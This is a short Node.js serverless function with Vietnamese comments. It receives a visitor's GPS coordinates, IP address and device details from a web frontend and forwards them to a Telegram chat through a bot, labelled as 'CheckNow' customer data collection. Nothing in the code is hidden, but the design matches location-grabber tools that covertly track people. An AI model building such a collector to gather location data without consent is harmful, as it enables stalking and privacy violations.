// api/send-data.js - Serverless function endpoint for secure data collection (e.g., Vercel)

const axios = require('axios');

/**
 * Lấy biến môi trường cho bảo mật.
 * Sử dụng process.env để đảm bảo các credential không bị lộ trong code.
 */
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
const CHAT_ID = process.env.TELEGRAM_CHAT_ID; 
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

/**
 * Hàm xử lý yêu cầu từ frontend, nhận tọa độ và dữ liệu thiết bị, sau đó gửi đến Telegram API.
 * @param {object} req - Request object chứa dữ liệu từ client (lat, lon, ip, device).
 */
module.exports = async (req, res) => {
    // 1. Kiểm tra tính toàn vẹn của cấu hình server
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error("Telegram credentials missing in environment variables.");
        return res.status(500).send({ error: "Server configuration failed (Missing Bot Token or Chat ID)." });
    }

    // 2. Lấy dữ liệu từ body request
    const { lat, lon, ip, device } = req.body;

    // 3. Kiểm tra tính hợp lệ của tọa độ GPS
    if (!lat || !lon) {
        console.log("Received invalid coordinates.");
        return res.status(400).send({ error: "Coordinates are required." });
    }

    // 4. Xây dựng nội dung tin nhắn cho Telegram (sử dụng Markdown để định dạng đẹp)
    const telegramText = `📦 *CheckNow - Dữ liệu khách hàng thu thập thành công*\n` +
                         `---------------------------------------------\n` +
                         `📍 *Vị trí GPS*: ${lat}, ${lon}\n` +
                         `🌐 *IP Địa chỉ*: ${ip || 'N/A'}\n` +
                         `📱 *Thiết bị*: ${device.browser} (${device.os})`;

    const telegramMessage = {
        chat_id: CHAT_ID,
        text: telegramText,
        parse_mode: "Markdown" // Cho phép định dạng chữ in đậm (*)
    };

    try {
        // 5. Gửi tin nhắn đến Telegram API bằng axios
        await axios.post(TELEGRAM_API_URL, telegramMessage);
        console.log("Successfully sent data to Telegram.");
        
        // Trả về thành công cho frontend biết
        res.status(200).send({ success: true, message: "Dữ liệu đã được gửi thành công." });

    } catch (error) {
        // 6. Bắt lỗi và trả về mã 500
        console.error("Error sending data to Telegram:", error.message);
        res.status(500).send({ success: false, message: "Lỗi khi gửi dữ liệu đến máy chủ hoặc Telegram API." });
    }
};
